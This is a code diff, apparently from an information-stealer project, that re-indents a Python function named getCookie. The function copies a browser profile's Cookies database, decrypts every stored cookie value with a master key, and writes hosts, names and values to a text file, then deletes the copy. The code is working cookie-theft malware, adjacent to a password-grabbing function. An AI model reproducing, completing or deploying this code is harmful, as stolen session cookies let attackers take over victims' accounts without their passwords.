@@ -514,19 +514,19 @@ def getPassw(path, arg):
 
 Cookies = []    
 def getCookie(self, name: str, path: str, profile: str) -> None:
-        path += '\\' + profile + '\\Network\\Cookies'
-        if not os.path.isfile(path):
-            return
-        copy2(path, "Cookievault.db")
-        conn = sqlite3.connect("Cookievault.db")
-        cursor = conn.cursor()
-        with open('.\\browser-cookies.txt', 'a', encoding="utf-8") as f:
-            for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
-                host_key, name, path, encrypted_value, expires_utc = res
-                value = self.decrypt_password(encrypted_value, self.masterkey)
-                if host_key and name and value != "":
-                    f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
-                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
+    path += '\\' + profile + '\\Network\\Cookies'
+    if not os.path.isfile(path):
+        return
+    copy2(path, "Cookievault.db")
+    conn = sqlite3.connect("Cookievault.db")
+    cursor = conn.cursor()
+    with open('.\\browser-cookies.txt', 'a', encoding="utf-8") as f:
+        for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
+            host_key, name, path, encrypted_value, expires_utc = res
+            value = self.decrypt_password(encrypted_value, self.masterkey)
+            if host_key and name and value != "":
+                f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
+                    host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
         cursor.close()
         conn.close()
         os.remove("Cookievault.db")
